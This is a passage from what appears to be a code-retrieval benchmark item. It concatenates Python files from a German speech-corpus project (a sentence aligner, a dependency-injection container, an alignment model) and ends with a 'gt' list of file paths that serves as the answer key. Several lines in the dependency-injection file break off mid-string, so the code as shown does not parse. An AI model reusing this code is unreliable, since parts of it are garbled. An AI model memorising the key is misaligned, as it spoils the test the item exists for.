= (align.leftIsPerfekt or align.isFirst) and (align.rightIsPerfekt or align.isLast) and not align.isSkipped\n        return alignments\n\n    def getMissingWordsBetweenAlignments(self, alignments:  List[SentenceAlignment], originalText: Sentence):\n        for index, aling in enumerate(alignments):\n            if index == len(alignments)-1:\n                continue\n\n            if not aling.rightIsPerfekt:\n                print(originalText[aling.end:alignments[index+1].start])\n\n        return alignments\n'HUI-Audio-Corpus-German/huiAudioCorpus/dependencyInjection/DependencyInjection.py'\n:def disableLog():\n    logging.getLogger('matplotlib').disabled = True\n    logging.getLogger('matplotlib.font_manager').disabled = True\n    logging.getLogger('matplotlib.colorbar').disabled = True\n    logging.getLogger('numba.core.ssa').disabled = True\n    logging.getLogger('numba.core.interpreter').disabled = True\n    logging.getLogger('numba.core.byteflow').disabled = True\n    logging.getLogger('numba.ssa').disabled = True\n    logging.getLogger('numba.byteflow').disabled = True\n    logging.getLogger('numba.interpreter').disabled = True\n    logging.getLogger('paramiko.transport.sftp').disabled = True\n    logging.getLogger('paramiko.transport').disabled = True\n    logging.getLogger('h5py._conv').disabled = True\n    logging.getLogger().setLevel(logging.WARNING)\n\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step8_DatasetStatistic import Step8_DatasetStatistic\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step9_GenerateCleanDataset import Step9_GenerateCleanDataset\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step7_AudioRawStatistic import Step7_AudioRawStatistic\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step3_1_PrepareText import Step3_1_PrepareText\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step0_Overview import Step0_Overview\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step2_1_AudioStatistic import Step2_1_AudioStatistic\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step6_FinalizeDataset import Step6_FinalizeDataset\nfrom huiAudioCorpus.transformer.SentenceDistanceTransformer import SentenceDistanceTransformer\nfrom huiAudioCorpus.calculator.AlignSentencesIntoTextCalculator import AlignSentencesIntoTextCalculator\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step5_AlignText import Step5_AlignText\nfrom huiAudioCorpus.converter.AudioToSentenceConverter import AudioToSentenceConverter\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step4_TranscriptAudio import Step4_TranscriptAudio\nfrom huiAudioCorpus.persistenz.GutenbergBookPersistenz import GutenbergBookPersistenz\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step3_DownloadText import Step3_DownloadText\nfrom huiAudioCorpus.transformer.AudioSplitTransformer import AudioSplitTransformer\nfrom huiAudioCorpus.transformer.AudioLoudnessTransformer import AudioLoudnessTransformer\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step2_SplitAudio import Step2_SplitAudio\nfrom huiAudioCorpus.persistenz.AudiosFromLibrivoxPersistenz import AudiosFromLibrivoxPersistenz\nfrom huiAudioCorpus.workflows.createDatasetWorkflow.Step1_DownloadAudio import Step1_DownloadAudio\nfrom huiAudioCorpus.converter.StringToSentencesConverter import StringToSentencesConverter\nfrom frosch import hook\nhook(theme = 'paraiso_dark')\nimport logging\ndisableLog()\n\nfrom huiAudioCorpus.error.DependencyInjectionError import DependencyInjectionError\nfrom huiAudioCorpus.converter.ListToHistogramConverter import ListToHistogramConverter\nfrom huiAudioCorpus.converter.ListToStatisticConverter import ListToStatisticConverter\nfrom huiAudioCorpus.ui.Plot import Plot\nfrom huiAudioCorpus.components.TextStatisticComponent import TextStatisticComponent\nfrom huiAudioCorpus.components.AudioStatisticComponent import AudioStatisticComponent\nfrom huiAudioCorpus.utils.PathUtil import PathUtil\nfrom huiAudioCorpus.utils.FileListUtil import FileListUtil\nfrom huiAudioCorpus.converter.TranscriptsToSentencesConverter import TranscriptsToSentencesConverter\nfrom huiAudioCorpus.persistenz.AudioTranscriptPairPersistenz import AudioTranscriptPairPersistenz\nfrom huiAudioCorpus.converter.PhoneticSentenceToSymbolSentenceConverter import PhoneticSentenceToSymbolSentenceConverter\nfrom huiAudioCorpus.converter.SentenceToPhoneticSentenceConverter import SentenceToPhoneticSentenceConverter\nfrom huiAudioCorpus.transformer.AudioAddSilenceTransformer import AudioAddSilenceTransformer\nfrom huiAudioCorpus.transformer.TranscriptsSelectionTransformer import TranscriptsSelectionTransformer\nfrom huiAudioCorpus.transformer.AudioSamplingRateTransformer import AudioSamplingRateTransformer\nfrom huiAudioCorpus.persistenz.TranscriptsPersistenz import TranscriptsPersistenz\nfrom huiAudioCorpus.persistenz.AudioPersistenz import AudioPersistenz\nfrom huiAudioCorpus.filter.AudioFilter import AudioFilter\nfrom huiAudioCorpus.transformer.AudioFadeTransformer import AudioFadeTransformer\nfrom huiAudioCorpus.calculator.TextNormalizer import TextNormalizer\n\nimport inspect\n\ndisableLog()\n\n\ndefaultConfig = {\n    'audioAddSilenceTransformer': {\n        'endDurationSeconds': 0.7,\n        'startDurationSeconds': 0\n    },\n    'listToHistogramConverter': {\n        'stepSize':1\n    }\n}\n\nclass DependencyInjection:\n\n    alignSentencesIntoTextCalculator: AlignSentencesIntoTextCalculator\n    textNormalizer: TextNormalizer\n\n\n\n    audioStatisticComponent: AudioStatisticComponent\n    textStatisticComponent: TextStatisticComponent\n\n\n    phoneticSentenceToSymbolSentenceConverter:PhoneticSentenceToSymbolSentenceConverter\n    sentenceToPhoneticSentenceConverter:SentenceToPhoneticSentenceConverter\n    transcriptsToSentencesConverter:TranscriptsToSentencesConverter\n    listToStatisticConverter:ListToStatisticConverter\n    listToHistogramConverter: ListToHistogramConverter\n    stringToSentencesConverter: StringToSentencesConverter\n    audioToSentenceConverter: AudioToSentenceConverter\n\n\n\n    audioFilter:AudioFilter\n\n\n    audioPersistenz:AudioPersistenz\n    audioTranscriptPairPersistenz:AudioTranscriptPairPersistenz\n    transcriptsPersistenz:TranscriptsPersistenz\n    audiosFromLibrivoxPersistenz:AudiosFromLibrivoxPersistenz\n    GutenbergBookPersistenz: GutenbergBookPersistenz\n\n\n    audioAddSilenceTransformer:AudioAddSilenceTransformer\n    audioSamplingRateTransformer:AudioSamplingRateTransformer\n    transcriptsSelectionTransformer:TranscriptsSelectionTransformer\n    audioSplitTransformer: AudioSplitTransformer\n    sentenceDistanceTransformer: SentenceDistanceTransformer\n    audioLoudnessTransformer: AudioLoudnessTransformer\n    audioFadeTransformer: AudioFadeTransformer\n\n\n\n    pathUtil:PathUtil\n    fileListUtil: FileListUtil\n\n\n    step0_Overview: Step0_Overview\n    step1_DownloadAudio: Step1_DownloadAudio\n    step2_SplitAudio: Step2_SplitAudio\n    step2_1_AudioStatistic: Step2_1_AudioStatistic\n    step3_DowloadText: Step3_DownloadText\n    step3_1_PrepareText: Step3_1_PrepareText\n    step4_TranscriptAudio: Step4_TranscriptAudio\n    step5_AlignText: Step5_AlignText\n    step6_FinalizeDataset: Step6_FinalizeDataset\n    step7_AudioRawStatistic: Step7_AudioRawStatistic\n    step8_DatasetStatistic: Step8_DatasetStatistic\n    step9_GenerateCleanDataset: Step9_GenerateCleanDataset\n\n\n    plot: Plot\n\n    def __init__(self, config={}):\n        configWithDefault = defaultConfig.copy()\n        configWithDefault.update(config)\n        self.allClassReferences = self.getAllClassReferences(configWithDefault)\n        initialedClasses = {}\n        for name, classInstance in self.allClassReferences.items():\n            def getLambda (name, classInstance):\n                return property(lambda _: self.initClass(name, classInstance, self.classConstructor, initialedClasses, configWithDefault, name ))\n            setattr(DependencyInjection, name, getLambda(name, classInstance))\n\n    def initClass(self, className, classReference , classConstructorMethod, initialedClasses, config , requestedClass = ''):\n        if className in initialedClasses:\n            return initialedClasses[className]\n        arguments = self.getConstructorReferenceClasses(classReference)\n        for argument in arguments:\n            if argument not in initialedClasses.values() and arguments[argument] is not None:\n                self.initClass(argument, arguments[argument], classConstructorMethod, initialedClasses, config, requestedClass)\n\n        classConfig = config[className].copy() if className in config else {}\n        if '\n            classConfig.pop('\n        classConfig\n        try:\n\n            newClassInstance = classConstructorMethod(classReference, initialedClasses, classConfig)\n        except Exception as e:\n            raise DependencyInjectionError(e, classConfig, classReference.__name__, requestedClass)\n        initialedClasses[className] = newClassInstance\n        return newClassInstance\n\n\n    def classConstructor(self,classReference, initialedClasses , classConfig):\n        classConstructor = classConfig.copy()\n        references = self.getConstructorReferenceClasses(classReference)\n        for ref in references:\n            if references[ref] is not None:\n                classConstructor[ref] = initialedClasses[ref]\n        classInstance = classReference(**classConstructor)\n\n        return classInstance\n\n    def getConstructorReferenceClasses(self, classReference):\n        arguments = self.getAllConstructorArguments(classReference)\n\n        references = {}\n        for argument in arguments:\n            if argument in [\"self\",\"args\",\"kwargs\"]:\n                continue\n            references[argument] = self.allClassReferences[argument] if argument in self.allClassReferences.keys() else None\n        return references\n\n    def getAllConstructorArguments(self, classInstance):\n        return list(inspect.signature(classInstance.__init__).parameters.keys())\n\n    def getAllClassReferences(self,configWithDefault):\n        classes = globalClassesAtImportTime.copy()\n        for className in configWithDefault:\n            if '\n                classes[className] = configWithDefault[className]['\n        return classes\n\n\nglobalClassesAtImportTime = DependencyInjection.__dict__.get(\"__annotations__\")\n'HUI-Audio-Corpus-German/huiAudioCorpus/model/SentenceAlignment.py'\n:from huiAudioCorpus.utils.ModelToStringConverter import ToString\nfrom huiAudioCorpus.model.Sentence import Sentence\n\nclass SentenceAlignment(ToString):\n    def __init__(self, sourceText: Sentence, alignedText: Sentence, start: int, end: int, distance: float, leftIsPerfekt:bool = False, rightIsPerfekt: bool = False, isFirst : bool = False, isLast: bool = False, isPerfect: bool = False, isSkipped: bool = False):\n        self.sourceText = sourceText\n        self.alignedText = alignedText\n        self.start = start\n        self.end = end\n        self.distance = distance\n        self.leftIsPerfekt = leftIsPerfekt\n        self.rightIsPerfekt= rightIsPerfekt\n        self.isFirst = isFirst\n        self.isLast = isLast\n        self.isPerfect = isPerfect\n        self.isSkipped = isSkipped",
        "gt": [
            "'HUI-Audio-Corpus-German/huiAudioCorpus/utils/ModelToStringConverter.py'",
            "'HUI-Audio-Corpus-German/huiAudioCorpus/model/SentenceAlignment.py'",
            "'HUI-Audio-Corpus-German/huiAudioCorpus/calculator/AlignSentencesIntoTextCalculator.py'",
            "'HUI-Audio-Corpus-German/huiAudioCorpus/workflows/createDatasetWorkflow/Step5_AlignText.py'",
            "'HUI-Audio-Corpus-German/huiAudioCorpus/dependencyInjection/DependencyInjection.py'",
            "'HUI-Audio-Corpus-German/huiAudioCorpus/workflows/createDatasetWorkflow/Step7_AudioRawStatistic.py'"
        ]
    }
]